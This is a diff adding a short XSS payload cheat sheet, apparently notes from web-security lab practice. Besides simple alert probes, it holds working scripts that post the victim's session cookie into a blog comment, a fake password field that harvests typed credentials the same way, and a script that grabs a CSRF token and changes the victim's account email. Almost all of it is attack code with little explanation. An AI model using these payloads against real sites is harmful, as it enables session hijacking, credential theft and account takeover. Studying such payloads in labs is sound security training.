@@ -1,0 +1,84 @@
+xss
+====
+
+
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>/* Bad stuff here... */</script>
+"onmouseover="alert(1)
+'-alert(1)-'
+javascript:alert(1)
+
+
+Exploiting cross-site scripting to steal cookies
+------------------------------------------------
+Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, 
+then manually inject the cookies into the browser and impersonate the victim.
+
+
+<script>
+window.addEventListener('DOMContentLoaded',function(){
+var token = document.getElementsByName('csrf')[0].value;
+var data = new FormData()
+data.append('csrf',token)
+data.append('postId', 8)
+data.append('coment',document.cookie)
+data.append('name','victim')
+data.append('email','somemail@gmail.com')
+
+fetch('/post/comment',{
+    method :'POST',
+    mode:'no-cors',
+    body:data
+});
+})
+</script>
+
+
+to steal password
+------------------
+
+<input type="text" name="username">
+<input type="password" name="password" onchange="hax()" >
+
+<script>
+
+
+
+function hax(){
+    var token = document.getElementsByName('csrf')[0].value;
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+
+    var data = new FormData();
+    data.append('csrf', token)
+    data.append('postId', 7)
+    data.append('comment', `${username} : ${password}`);   
+    data.append('name', 'victim')
+    data.append('email', 'somemail@gmail.com');
+    data.append('website', 'somesite.com');
+
+    fetch('/post/comment', {
+        method :'POST',
+        mode :'no-cors',
+        body :data
+    });
+}
+
+</script>
+
+email
+------
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
